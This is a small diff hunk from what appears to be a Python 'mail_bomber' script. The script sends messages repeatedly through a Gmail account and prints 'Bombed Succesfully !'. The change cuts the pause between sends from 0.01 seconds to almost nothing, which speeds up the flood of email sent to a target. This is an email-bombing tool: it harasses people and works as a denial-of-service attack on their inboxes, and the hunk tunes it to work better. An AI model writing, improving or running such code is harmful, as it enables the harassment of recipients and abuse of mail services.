@@ -44,7 +44,7 @@ def mail_bomber():
 	   server.sendmail(credential.gmail, mail_2, msg)
 	   print("\n")
 	
-	   time.sleep(0.01)
+	   time.sleep(0.0000000001)
 	   os.system('clear')
 	print(colored("\nBombed Succesfully !", "green"))
 	
